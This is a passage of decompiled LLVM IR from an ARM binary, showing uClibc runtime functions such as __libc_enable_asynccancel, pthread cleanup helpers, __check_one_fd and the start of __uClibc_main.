  %v0_dd2c = phi i32 [ %v0_dd28, %dec_label_pc_dd28 ], [ %v2_dd0824, %dec_label_pc_dcf8 ], [ %v2_dd08, %dec_label_pc_dd14.dec_label_pc_dd08_crit_edge ]
  %v1_dd2c = phi i32 [ %v0_dd28, %dec_label_pc_dd28 ], [ %v0_dcf8, %dec_label_pc_dcf8 ], [ %v1_dd0c.pre, %dec_label_pc_dd14.dec_label_pc_dd08_crit_edge ]
  %v3_dd2c = icmp uge i32 %v0_dd2c, %v1_dd2c
  store i1 %v3_dd2c, i1* %cpsr_c.global-to-local, align 1
  %v9_dd2c = icmp eq i32 %v0_dd2c, %v1_dd2c
  br i1 %v9_dd2c, label %dec_label_pc_dd54.preheader, label %dec_label_pc_dd2c.dec_label_pc_dcf8_crit_edge

dec_label_pc_dd2c.dec_label_pc_dcf8_crit_edge:    ; preds = %dec_label_pc_dd2c
  %v0_dd04.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_dcf8

dec_label_pc_dd54.preheader:                      ; preds = %dec_label_pc_dd2c
  %v0_dd541 = load i32, i32* %r7.global-to-local, align 4
  %v1_dd542 = and i32 %v0_dd541, 12
  store i32 %v1_dd542, i32* @r3, align 4
  %v2_dd583 = icmp ugt i32 %v1_dd542, 3
  store i1 %v2_dd583, i1* %cpsr_c.global-to-local, align 1
  %v7_dd585 = icmp eq i32 %v1_dd542, 4
  br i1 %v7_dd585, label %dec_label_pc_dd38.lr.ph, label %dec_label_pc_dd54.preheader.dec_label_pc_dd60.loopexit_crit_edge

dec_label_pc_dd54.preheader.dec_label_pc_dd60.loopexit_crit_edge: ; preds = %dec_label_pc_dd54.preheader
  %v1_dd64.pre.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_dd60.loopexit

dec_label_pc_dd38.lr.ph:                          ; preds = %dec_label_pc_dd54.preheader
  %v0_dd3c.pre = load i32, i32* %r5.global-to-local, align 4
  %v1_dd3c = add i32 %v0_dd3c.pre, 132
  %v2_dd50 = inttoptr i32 %v1_dd3c to i32*
  br label %dec_label_pc_dd38

dec_label_pc_dd38:                                ; preds = %dec_label_pc_dd38.lr.ph, %dec_label_pc_dd38
  %v0_dd38 = phi i32 [ %v0_dd541, %dec_label_pc_dd38.lr.ph ], [ %v3_dd50, %dec_label_pc_dd38 ]
  store i32 %v0_dd38, i32* @r2, align 4
  store i32 %v1_dd3c, i32* %r0.global-to-local, align 4
  store i32 128, i32* @r1, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  %v3_dd50 = load i32, i32* %v2_dd50, align 4
  store i32 %v3_dd50, i32* %r7.global-to-local, align 4
  %v1_dd54 = and i32 %v3_dd50, 12
  store i32 %v1_dd54, i32* @r3, align 4
  %v7_dd58 = icmp eq i32 %v1_dd54, 4
  br i1 %v7_dd58, label %dec_label_pc_dd38, label %dec_label_pc_dd54.dec_label_pc_dd60.loopexit_crit_edge

dec_label_pc_dd54.dec_label_pc_dd60.loopexit_crit_edge: ; preds = %dec_label_pc_dd38
  %v2_dd58 = icmp ugt i32 %v1_dd54, 3
  store i1 %v2_dd58, i1* %cpsr_c.global-to-local, align 1
  br label %dec_label_pc_dd60.loopexit

dec_label_pc_dd60.loopexit:                       ; preds = %dec_label_pc_dd54.preheader.dec_label_pc_dd60.loopexit_crit_edge, %dec_label_pc_dd54.dec_label_pc_dd60.loopexit_crit_edge
  %v1_dd64.pre = phi i32 [ %v1_dd64.pre.pre, %dec_label_pc_dd54.preheader.dec_label_pc_dd60.loopexit_crit_edge ], [ %v1_dd3c, %dec_label_pc_dd54.dec_label_pc_dd60.loopexit_crit_edge ]
  %v2_dd60.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_dd60

dec_label_pc_dd60:                                ; preds = %dec_label_pc_dd60.loopexit, %entry
  %v1_dd64 = phi i32 [ %v1_dd64.pre, %dec_label_pc_dd60.loopexit ], [ %v0_dce0, %entry ]
  %v2_dd60 = phi i32 [ %v2_dd60.pre, %dec_label_pc_dd60.loopexit ], [ %v3_dce4, %entry ]
  store i32 %v2_dd60, i32* @r4, align 4
  ret i32 %v1_dd64

; uselistorder directives
  uselistorder i32 %v3_dd50, { 1, 2, 0 }
  uselistorder i32 %v1_dd3c, { 0, 2, 1 }
  uselistorder i32 %v0_dd28, { 1, 0 }
  uselistorder i32 %v1_dd0c.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_dcf8, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32* %r5.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 4, 3, 5, 0, 1 }
  uselistorder i1* %cpsr_c.global-to-local, { 2, 1, 3, 5, 4, 0 }
  uselistorder label %dec_label_pc_dd60.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_dd38, { 1, 0 }
  uselistorder label %dec_label_pc_dd2c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_dd14, { 1, 0 }
}

define i32 @__libc_enable_asynccancel() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_dd68 = load i32, i32* @r4, align 4
  store i32 %v3_dd68, i32* %stack_var_-24, align 4
  store i32 ptrtoint (i32* @global_var_1450c.257 to i32), i32* %r8.global-to-local, align 4
  %v0_dd70 = call i32 @__aeabi_read_tp()
  %v1_dd74 = add i32 %v0_dd70, -1036
  %v2_dd74 = inttoptr i32 %v1_dd74 to i32*
  %v3_dd74 = load i32, i32* %v2_dd74, align 4
  store i32 %v3_dd74, i32* %r6.global-to-local, align 4
  %v1_dd78 = add i32 %v0_dd70, -1168
  store i32 %v1_dd78, i32* %r7.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22290.79 to i32), i32* %r8.global-to-local, align 4
  %v1_dd8046 = or i32 %v3_dd74, 2
  store i32 %v1_dd8046, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_dd8449 = icmp eq i32 %v1_dd8046, %v3_dd74
  br i1 %v9_dd8449, label %dec_label_pc_de30, label %dec_label_pc_dd8c

dec_label_pc_dd8c:                                ; preds = %entry, %bb.dec_label_pc_dd8c_crit_edge
  %v0_dd90 = phi i32 [ %v0_dd90.pre, %bb.dec_label_pc_dd8c_crit_edge ], [ %v1_dd78, %entry ]
  %v1_dd8051 = phi i32 [ %v1_dd80, %bb.dec_label_pc_dd8c_crit_edge ], [ %v1_dd8046, %entry ]
  %v0_dd9450 = phi i32 [ %v1_ddc0, %bb.dec_label_pc_dd8c_crit_edge ], [ %v3_dd74, %entry ]
  store i32 %v1_dd8051, i32* @r1, align 4
  %v1_dd90 = add i32 %v0_dd90, 132
  store i32 %v1_dd90, i32* %r2.global-to-local, align 4
  store i32 %v0_dd9450, i32* %r4.global-to-local, align 4
  %v1_dd9834 = inttoptr i32 %v1_dd90 to i32*
  %v2_dd9835 = load i32, i32* %v1_dd9834, align 4
  store i32 %v2_dd9835, i32* @r3, align 4
  %v3_dd9c37 = icmp uge i32 %v2_dd9835, %v0_dd9450
  store i1 %v3_dd9c37, i1* %cpsr_c.global-to-local, align 1
  %v9_dd9c43 = icmp eq i32 %v2_dd9835, %v0_dd9450
  br i1 %v9_dd9c43, label %dec_label_pc_dda4, label %dec_label_pc_ddbc

dec_label_pc_dda4:                                ; preds = %dec_label_pc_dd8c, %dec_label_pc_dda4.dec_label_pc_dd98_crit_edge
  call void @__pseudo_branch(i32 -61504)
  %v0_ddb4 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_ddb4, label %dec_label_pc_ddb8, label %dec_label_pc_dda4.dec_label_pc_dd98_crit_edge

dec_label_pc_dda4.dec_label_pc_dd98_crit_edge:    ; preds = %dec_label_pc_dda4
  %v0_dd98.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_dd9c.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_dd98 = inttoptr i32 %v0_dd98.pre to i32*
  %v2_dd98 = load i32, i32* %v1_dd98, align 4
  store i32 %v2_dd98, i32* @r3, align 4
  %v3_dd9c = icmp uge i32 %v2_dd98, %v1_dd9c.pre
  store i1 %v3_dd9c, i1* %cpsr_c.global-to-local, align 1
  %v9_dd9c = icmp eq i32 %v2_dd98, %v1_dd9c.pre
  br i1 %v9_dd9c, label %dec_label_pc_dda4, label %dec_label_pc_ddbc

dec_label_pc_ddb8:                                ; preds = %dec_label_pc_dda4
  %v0_ddb8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_ddb8, i32* @r3, align 4
  br label %dec_label_pc_ddbc

dec_label_pc_ddbc:                                ; preds = %dec_label_pc_dd8c, %dec_label_pc_dda4.dec_label_pc_dd98_crit_edge, %dec_label_pc_ddb8
  %v1_ddc0 = phi i32 [ %v0_ddb8, %dec_label_pc_ddb8 ], [ %v2_dd9835, %dec_label_pc_dd8c ], [ %v2_dd98, %dec_label_pc_dda4.dec_label_pc_dd98_crit_edge ]
  %v1_ddbc = load i32, i32* %r6.global-to-local, align 4
  %v3_ddbc = icmp uge i32 %v1_ddc0, %v1_ddbc
  store i1 %v3_ddbc, i1* %cpsr_c.global-to-local, align 1
  %v9_ddbc = icmp eq i32 %v1_ddc0, %v1_ddbc
  br i1 %v9_ddbc, label %dec_label_pc_ddc8, label %bb

bb:                                               ; preds = %dec_label_pc_ddbc
  store i32 %v1_ddc0, i32* %r6.global-to-local, align 4
  %v1_dd80 = or i32 %v1_ddc0, 2
  store i32 %v1_dd80, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_dd84 = icmp eq i32 %v1_dd80, %v1_ddc0
  br i1 %v9_dd84, label %dec_label_pc_de30, label %bb.dec_label_pc_dd8c_crit_edge

bb.dec_label_pc_dd8c_crit_edge:                   ; preds = %bb
  %v0_dd90.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_dd8c

dec_label_pc_ddc8:                                ; preds = %dec_label_pc_ddbc
  %v0_ddc8 = load i32, i32* %r5.global-to-local, align 4
  %v1_ddc8 = and i32 %v0_ddc8, -69
  store i32 %v1_ddc8, i32* @r3, align 4
  %v2_ddcc = icmp ugt i32 %v1_ddc8, 9
  store i1 %v2_ddcc, i1* %cpsr_c.global-to-local, align 1
  %v7_ddcc = icmp eq i32 %v1_ddc8, 10
  br i1 %v7_ddcc, label %dec_label_pc_ddd4, label %dec_label_pc_de30

dec_label_pc_ddd4:                                ; preds = %dec_label_pc_ddc8
  %v1_ddd8 = load i32, i32* %r7.global-to-local, align 4
  %v2_ddd8 = add i32 %v1_ddd8, 544
  %v3_ddd8 = inttoptr i32 %v2_ddd8 to i32*
  store i32 -1, i32* %v3_ddd8, align 4
  %v0_dddc = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_dddc, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_dde0

dec_label_pc_dde0:                                ; preds = %dec_label_pc_de14.dec_label_pc_dde0_crit_edge, %dec_label_pc_ddd4
  %v0_dde4 = phi i32 [ %v0_dde4.pre, %dec_label_pc_de14.dec_label_pc_dde0_crit_edge ], [ %v0_dddc, %dec_label_pc_ddd4 ]
  %v0_dde0 = load i32, i32* %r7.global-to-local, align 4
  %v1_dde0 = add i32 %v0_dde0, 132
  %v2_dde0 = inttoptr i32 %v1_dde0 to i32*
  %v3_dde0 = load i32, i32* %v2_dde0, align 4
  store i32 %v0_dde4, i32* %r2.global-to-local, align 4
  store i32 %v3_dde0, i32* %r4.global-to-local, align 4
  %v1_ddec = or i32 %v3_dde0, 16
  store i32 %v1_ddec, i32* @r1, align 4
  %v1_ddf022 = inttoptr i32 %v0_dde4 to i32*
  %v2_ddf023 = load i32, i32* %v1_ddf022, align 4
  %v3_ddf425 = icmp uge i32 %v2_ddf023, %v3_dde0
  store i1 %v3_ddf425, i1* %cpsr_c.global-to-local, align 1
  %v9_ddf431 = icmp eq i32 %v2_ddf023, %v3_dde0
  br i1 %v9_ddf431, label %dec_label_pc_ddfc, label %dec_label_pc_de14

dec_label_pc_ddfc:                                ; preds = %dec_label_pc_dde0, %dec_label_pc_ddfc.dec_label_pc_ddf0_crit_edge
  call void @__pseudo_branch(i32 -61504)
  %v0_de0c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_de0c, label %dec_label_pc_de10, label %dec_label_pc_ddfc.dec_label_pc_ddf0_crit_edge

dec_label_pc_ddfc.dec_label_pc_ddf0_crit_edge:    ; preds = %dec_label_pc_ddfc
  %v0_ddf0.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_ddf4.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_ddf0 = inttoptr i32 %v0_ddf0.pre to i32*
  %v2_ddf0 = load i32, i32* %v1_ddf0, align 4
  %v3_ddf4 = icmp uge i32 %v2_ddf0, %v1_ddf4.pre
  store i1 %v3_ddf4, i1* %cpsr_c.global-to-local, align 1
  %v9_ddf4 = icmp eq i32 %v2_ddf0, %v1_ddf4.pre
  br i1 %v9_ddf4, label %dec_label_pc_ddfc, label %dec_label_pc_de14

dec_label_pc_de10:                                ; preds = %dec_label_pc_ddfc
  %v0_de10 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_de14

dec_label_pc_de14:                                ; preds = %dec_label_pc_dde0, %dec_label_pc_ddfc.dec_label_pc_ddf0_crit_edge, %dec_label_pc_de10
  %v0_de14 = phi i32 [ %v0_de10, %dec_label_pc_de10 ], [ %v2_ddf023, %dec_label_pc_dde0 ], [ %v2_ddf0, %dec_label_pc_ddfc.dec_label_pc_ddf0_crit_edge ]
  %v1_de14 = phi i32 [ %v0_de10, %dec_label_pc_de10 ], [ %v3_dde0, %dec_label_pc_dde0 ], [ %v1_ddf4.pre, %dec_label_pc_ddfc.dec_label_pc_ddf0_crit_edge ]
  %v3_de14 = icmp uge i32 %v0_de14, %v1_de14
  store i1 %v3_de14, i1* %cpsr_c.global-to-local, align 1
  %v9_de14 = icmp eq i32 %v0_de14, %v1_de14
  br i1 %v9_de14, label %dec_label_pc_de1c, label %dec_label_pc_de14.dec_label_pc_dde0_crit_edge

dec_label_pc_de14.dec_label_pc_dde0_crit_edge:    ; preds = %dec_label_pc_de14
  %v0_dde4.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_dde0

dec_label_pc_de1c:                                ; preds = %dec_label_pc_de14
  store i32 124, i32* @r3, align 4
  %v0_de24 = load i32, i32* %r8.global-to-local, align 4
  %v2_de24 = add i32 %v0_de24, 124
  %v3_de24 = inttoptr i32 %v2_de24 to i32*
  %v4_de24 = load i32, i32* %v3_de24, align 4
  store i32 %v4_de24, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_de24)
  %v0_de30.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_de30

dec_label_pc_de30:                                ; preds = %entry, %bb, %dec_label_pc_ddc8, %dec_label_pc_de1c
  %v0_de30 = phi i32 [ %v1_ddc0, %dec_label_pc_ddc8 ], [ %v0_de30.pre, %dec_label_pc_de1c ], [ %v3_dd74, %entry ], [ %v1_ddc0, %bb ]
  %v2_de34 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_de34, i32* @r4, align 4
  ret i32 %v0_de30

; uselistorder directives
  uselistorder i32 %v0_de10, { 1, 0 }
  uselistorder i32 %v1_ddf4.pre, { 0, 2, 1 }
  uselistorder i32 %v1_dd80, { 1, 2, 0 }
  uselistorder i32 %v1_ddbc, { 1, 0 }
  uselistorder i32 %v1_ddc0, { 0, 1, 4, 3, 5, 6, 7, 2 }
  uselistorder i32 %v1_dd9c.pre, { 1, 0 }
  uselistorder i32 %v0_dd9450, { 2, 1, 0 }
  uselistorder i32* %r7.global-to-local, { 1, 2, 0, 3 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i1* %cpsr_c.global-to-local, { 3, 5, 4, 0, 6, 10, 7, 9, 8, 2, 1 }
  uselistorder label %dec_label_pc_de30, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_de14, { 2, 1, 0 }
  uselistorder label %dec_label_pc_ddfc, { 1, 0 }
  uselistorder label %dec_label_pc_ddbc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_dda4, { 1, 0 }
  uselistorder label %dec_label_pc_dd8c, { 1, 0 }
}

define i32 @__pthread_return_0() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__pthread_mutex_init() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @_pthread_cleanup_push_defer(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %arg2, i32* %arg1, align 4
  %v3_de54 = add i32 %tmp, 4
  %v4_de54 = inttoptr i32 %v3_de54 to i32*
  store i32 %arg3, i32* %v4_de54, align 4
  ret i32 %tmp
}

define i32 @_pthread_cleanup_pop_restore(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v2_de60 = icmp eq i32 %arg2, 0
  br i1 %v2_de60, label %.thread1, label %bb

bb:                                               ; preds = %entry
  %v2_de6c = add i32 %tmp, 4
  %v3_de6c = inttoptr i32 %v2_de6c to i32*
  %v4_de6c = load i32, i32* %v3_de6c, align 4
  store i32 %v4_de6c, i32* %r0.global-to-local, align 4
  %v3_de70 = load i32, i32* %arg1, align 4
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb
  %.02 = phi i32 [ %v3_de70, %bb ], [ undef, %entry ]
  %v2_de78 = xor i1 %v2_de60, true
  call void @__pseudo_cond_branch(i1 %v2_de78, i32 %.02)
  %v1_de84 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_de84

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 1, 2, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__GI___uClibc_fini() local_unnamed_addr {
dec_label_pc_deac.lr.ph:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_de88 = load i32, i32* @r4, align 4
  store i32 %v3_de88, i32* %stack_var_-16, align 4
  store i32 ptrtoint (i32* @global_var_22290.79 to i32), i32* %r5.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 -8), i32* %r6.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_deac

dec_label_pc_deac:                                ; preds = %dec_label_pc_deac.dec_label_pc_deac_crit_edge, %dec_label_pc_deac.lr.ph
  %v1_deac = phi i32 [ %v1_deb8, %dec_label_pc_deac.dec_label_pc_deac_crit_edge ], [ 0, %dec_label_pc_deac.lr.ph ]
  %v0_deac = phi i32 [ %v0_deac.pre, %dec_label_pc_deac.dec_label_pc_deac_crit_edge ], [ add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 -8), %dec_label_pc_deac.lr.ph ]
  %v4_deac = mul i32 %v1_deac, 4
  %v5_deac = add i32 %v4_deac, %v0_deac
  %v6_deac = inttoptr i32 %v5_deac to i32*
  %v7_deac = load i32, i32* %v6_deac, align 4
  call void @__pseudo_branch(i32 %v7_deac)
  %v0_deb8 = load i32, i32* %r4.global-to-local, align 4
  %v1_deb8 = add i32 %v0_deb8, -1
  store i32 %v1_deb8, i32* %r4.global-to-local, align 4
  %v2_deb8 = icmp eq i32 %v0_deb8, 0
  br i1 %v2_deb8, label %dec_label_pc_dec0, label %dec_label_pc_deac.dec_label_pc_deac_crit_edge

dec_label_pc_deac.dec_label_pc_deac_crit_edge:    ; preds = %dec_label_pc_deac
  %v0_deac.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_deac

dec_label_pc_dec0:                                ; preds = %dec_label_pc_deac
  %v0_dec4.pre = load i32, i32* %r5.global-to-local, align 4
  %v2_dec4 = add i32 %v0_dec4.pre, 2620
  %v3_dec4 = inttoptr i32 %v2_dec4 to i32*
  %v4_dec4 = load i32, i32* %v3_dec4, align 4
  %v2_dec8 = icmp eq i32 %v4_dec4, 0
  br i1 %v2_dec8, label %bb17, label %bb

bb:                                               ; preds = %dec_label_pc_dec0
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_dec0, %bb
  %v2_ded0 = xor i1 %v2_dec8, true
  call void @__pseudo_cond_branch(i1 %v2_ded0, i32 %v4_dec4)
  %v0_ded8 = load i32, i32* %r5.global-to-local, align 4
  %v2_ded8 = add i32 %v0_ded8, 2624
  %v3_ded8 = inttoptr i32 %v2_ded8 to i32*
  %v4_ded8 = load i32, i32* %v3_ded8, align 4
  %v2_dedc = icmp eq i32 %v4_ded8, 0
  br i1 %v2_dedc, label %bb19, label %bb18

bb18:                                             ; preds = %bb17
  br label %bb19

bb19:                                             ; preds = %bb17, %bb18
  %v2_dee4 = xor i1 %v2_dedc, true
  call void @__pseudo_cond_branch(i1 %v2_dee4, i32 %v4_ded8)
  %v2_dee8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_dee8, i32* %r4.global-to-local, align 4
  %v1_deec = load i32, i32* @r0, align 4
  ret i32 %v1_deec

; uselistorder directives
  uselistorder i32 %v1_deb8, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 1, 3, 2, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @__check_one_fd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_df04 = load i32, i32* @r4, align 4
  %v6_df04 = load i32, i32* @r5, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg1, i32* @r4, align 4
  %v2_df18 = call i32 @__libc_fcntl(i32 %arg1, i32 1)
  %v3_df20 = icmp eq i32 %v2_df18, -1
  store i32 ptrtoint (i32* @global_var_22290.79 to i32), i32* @r3, align 4
  br i1 %v3_df20, label %dec_label_pc_df2c, label %dec_label_pc_df44

dec_label_pc_df2c:                                ; preds = %entry
  %v0_df30 = load i32, i32* @r5, align 4
  %v2_df38 = call i32 @__libc_open(i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 -37300), i32 %v0_df30)
  %v1_df3c = load i32, i32* @r4, align 4
  %v1_df40 = icmp ne i32 %v2_df38, %v1_df3c
  call void @__pseudo_cond_branch(i1 %v1_df40, i32 ptrtoint (i32* @global_var_c2b4.266 to i32))
  br label %dec_label_pc_df44

dec_label_pc_df44:                                ; preds = %entry, %dec_label_pc_df2c
  %v1_df4c = phi i32 [ %v2_df18, %entry ], [ %v2_df38, %dec_label_pc_df2c ]
  store i32 %v3_df04, i32* @r4, align 4
  store i32 %v6_df04, i32* @r5, align 4
  ret i32 %v1_df4c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_df44, { 1, 0 }
}

define i32 @__GI___uClibc_init(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_df58 = load i32, i32* @r4, align 4
  store i32 %v3_df58, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i32* @global_var_22290.79 to i32), i32* %r4.global-to-local, align 4
  %v4_df68 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 156) to i32*), align 4
  %v1_df6c = inttoptr i32 %v4_df68 to i32*
  %v2_df6c = load i32, i32* %v1_df6c, align 4
  %v2_df70 = icmp eq i32 %v2_df6c, 0
  br i1 %v2_df70, label %dec_label_pc_df78, label %dec_label_pc_df9c

dec_label_pc_df78:                                ; preds = %entry
  store i32 4096, i32* %v1_df6c, align 4
  %v0_df80 = call i32 @__pthread_initialize_minimal()
  %v0_df88 = load i32, i32* %r4.global-to-local, align 4
  %v2_df88 = add i32 %v0_df88, -76572
  %v2_df90 = icmp eq i32 %v2_df88, 0
  br i1 %v2_df90, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_df78
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_df78, %bb
  %v2_df98 = xor i1 %v2_df90, true
  call void @__pseudo_cond_branch(i1 %v2_df98, i32 %v2_df88)
  %v2_df9c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_df9c

dec_label_pc_df9c:                                ; preds = %entry, %bb4
  %v2_df9c = phi i32 [ %v2_df9c.pre, %bb4 ], [ %v3_df58, %entry ]
  %.0 = phi i32 [ %v0_df80, %bb4 ], [ undef, %entry ]
  store i32 %v2_df9c, i32* %r4.global-to-local, align 4
  ret i32 %.0

; uselistorder directives
  uselistorder i32 undef, { 1, 0, 2 }
  uselistorder label %dec_label_pc_df9c, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @__uClibc_main(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %tmp = ptrtoint i32* %arg3 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp62 = call i32 @__decompiler_undefined_function_0()
  %tmp63 = call i32 @__decompiler_undefined_function_0()
  %tmp64 = call i32 @__decompiler_undefined_function_0()
  %tmp65 = call i32 @__decompiler_undefined_function_0()
  %tmp66 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-400 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-416 = alloca i32, align 4
  store i32 82624, i32* %r4.global-to-local, align 4
  %v1_dfbc = add i32 %tmp, 4
  store i32 %v1_dfbc, i32* %ip.global-to-local, align 4
  %v2_dfc0 = load i32, i32* %arg3, align 4
  store i32 24, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22290.79 to i32), i32* %r4.global-to-local, align 4
  %v3_dfcc = mul i32 %arg2, 4
  store i32 %v3_dfcc, i32* @r7, align 4
  %v4_dfd4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 24) to i32*), align 4
  store i32 %v4_dfd4, i32* %r1.global-to-local, align 4
  store i32 60, i32* %r2.global-to-local, align 4
  %v2_dfdc = add i32 %v1_dfbc, %v3_dfcc
  store i32 %v2_dfdc, i32* %ip.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22290.79 to i32), i32* %stack_var_-416, align 4
  %v4_dfe4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 60) to i32*), align 4
  store i32 %v4_dfe4, i32* %r4.global-to-local, align 4
  %v3_dfe8 = icmp uge i32 %v2_dfdc, %v2_dfc0
  store i1 %v3_dfe8, i1* %cpsr_c.global-to-local, align 1
  %v9_dfe8 = icmp eq i32 %v2_dfdc, %v2_dfc0
  store i1 %v9_dfe8, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg7, i32* %r2.global-to-local, align 4
  %v2_dff0 = inttoptr i32 %v4_dfe4 to i32*
  store i32 %v2_dfdc, i32* %v2_dff0, align 4
  br i1 %v9_dfe8, label %bb, label %bb75

bb:                                               ; preds = %entry
  store i32 %tmp, i32* %ip.global-to-local, align 4
  br label %bb75

bb75:                                             ; preds = %entry, %bb
  %v0_dff8 = load i32, i32* %r2.global-to-local, align 4
  %v1_dff8 = load i32, i32* %r1.global-to-local, align 4
  %v2_dff8 = inttoptr i32 %v1_dff8 to i32*
  store i32 %v0_dff8, i32* %v2_dff8, align 4
  %v2_dffc = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_dffc, i32* %r5.global-to-local, align 4
  store i32 %arg6, i32* %r1.global-to-local, align 4
  store i32 2624, i32* %r2.global-to-local, align 4
  %v0_e008 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_e008, i32* @r6, align 4
  br i1 %v9_dfe8, label %bb76, label %.thread52

.thread52:                                        ; preds = %bb75
  %v3_e01053 = add i32 %v2_dffc, 2624
  %v4_e01054 = inttoptr i32 %v3_e01053 to i32*
  store i32 %arg6, i32* %v4_e01054, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  br label %bb77

bb76:                                             ; preds = %bb75
  %v1_e00c = load i32, i32* %ip.global-to-local, align 4
  %v2_e00c = load i32, i32* @r7, align 4
  %v3_e00c = add i32 %v2_e00c, %v1_e00c
  store i32 %v3_e00c, i32* %r3.global-to-local, align 4
  %v3_e01050 = add i32 %v2_dffc, 2624
  %v4_e01051 = inttoptr i32 %v3_e01050 to i32*
